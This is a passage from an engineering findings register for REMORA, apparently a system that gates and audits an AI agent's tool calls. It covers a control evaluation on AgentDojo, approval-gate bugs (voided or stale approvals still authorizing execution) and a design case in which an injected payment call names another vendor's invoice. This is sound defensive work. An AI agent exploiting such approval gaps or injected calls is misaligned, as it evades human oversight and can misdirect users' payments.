| Claim | The evidence rests on substituted wrong calls (4 of 295 in-catalogue in C-ext4), and refuse-all meets most safety targets. REMORA blocked 90 of 91 legitimate AgentDojo calls in the development dry run. The SAP v7 draft kept an inspected task in the test split and had a degenerate H3. |
| Evidence | `artifacts/control_eval/dev_dry_run_v1.json` (E1 and E2: 90 of 91 blocked, utility 11 of 29 against 10 for refuse-all); SAP v7 §2 and §7 before `86b2b207`. The first two points are PRF-008 and PRF-010. |
| Affected claims | CLAIM-019, CLAIM-021 (context) |
| Action | In SAP v7, inspected tasks never enter test, H3 is measured as partial AUROC and tested only if E1 blocks at most half the legitimate calls on development data, and each arm gets a summary refuse-all cannot pass. The dry-run result is NEGATIVE_RESULTS.md §92. |
| Owning PR | #937 (`86b2b207`), in master via `8ccd406c` |
| Verification | `tests/test_control_eval_harness.py` (28 tests) passes. The draft is not sealed and no confirmatory data exist; the dry run must be repeated before sealing (SAP v7 §5). |
| Status | IN_PROGRESS |

### PRF-056 Mutation testing covers only the token, gate, lease and nonce files (RMR-AUD-013)

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | `[tool.mutmut]` and `docs/assurance/mutation_testing_v1.md` cover `remora/enforcement/{token,gate,lease,nonce_store}.py` only. The review queue, the execution service, the projections and `remora/flow/`, where the R3 defects were, sit outside the sweep and have no stateful lifecycle test. |
| Evidence | `pyproject.toml` `[tool.mutmut]`; `docs/assurance/mutation_testing_v1.md:5`. |
| Affected claims | none |
| Action | Extend the mutation scope, and add a stateful lifecycle test (Hypothesis `RuleBasedStateMachine`) over assess, approve, expire or invalidate, re-approve, execute and record effect. |
| Owning PR | not yet opened |
| Verification | Pending. |
| Status | OPEN |

### PRF-057 An approved VERIFY survived a new VERIFY reason (follow-up to #936)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The reason-subset check in `_approval_survives` ran only for an approved ESCALATE. An approved VERIFY whose fresh decision was VERIFY for a new reason, such as an ungrounded argument after the entity was deleted, still executed. |
| Evidence | Diff review of #936. Fix: `remora/governance/review_queue.py:85`. |
| Affected claims | none |
| Action | Require the fresh reasons to lie within the approved reasons for VERIFY approvals too. |
| Owning PR | `24541235`, in master via `5b2c7dc8` |
| Verification | `tests/test_review_path_audit_r3.py::test_a_new_verify_reason_invalidates_an_approved_verify` passes. |
| Status | RESOLVED |

### PRF-058 Effect lineage accepted an approval that had been voided (follow-up to #942)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | `_authorization_of` looked for any `approved` event in the history, so an approval that later expired or was invalidated, with no new one, still authorized a dispatch. |
| Evidence | Diff review of #942. Fix: `remora/governance/effect_receipt.py:184`; the approval must be live at the matching `execution_authorized`. |
| Affected claims | none |
| Action | Track in chain order whether an approval is live. |
| Owning PR | `2d8b8682`, in master via `dbd19f23` |
| Verification | `tests/test_effect_lineage_and_audit_projection.py::test_a_voided_approval_does_not_authorize_a_later_dispatch` passes. |
| Status | RESOLVED |

### PRF-059 The chain-only state projection stuck at DISPATCHING (follow-up to #942)

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | `_fold_state` had no branch for `execution_result`, so without an outbox projection the state stayed DISPATCHING after the result was in the chain. |
| Evidence | Diff review of #942. Fix: `remora/execution/projections.py:250`. |
| Affected claims | none |
| Action | Add an explicit `execution_result` branch. |
| Owning PR | consolidation `5b2c7dc8` |
| Verification | `tests/test_effect_lineage_and_audit_projection.py::test_a_result_without_an_outbox_projection_is_not_stuck_dispatching` passes. |
| Status | RESOLVED |

### PRF-060 ABER case B matched another open obligation of the same tenant (follow-up to #943)

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | In the SDD, case B accepted a payment when the registry held a matching open obligation. With ten open invoices, an injected call naming another vendor's real invoice would match. |
| Evidence | Diff review of #943; `docs/design/compositional-authority-preservation-v1.md:307`. |
| Affected claims | none |
| Action | The counterparty, and the reference and amount where the task names them, must lie inside the entities the user authorised (L0/L1). The ten-invoices case is a falsification test of CAPR-04/05. |
| Owning PR | consolidation `5b2c7dc8` (design text) |
| Verification | The SDD states the binding and the ten-invoices test at line 307. This fixes the design only; ABER itself is not implemented (CAPR-04 and CAPR-05 are ABSENT). |
| Status | RESOLVED |

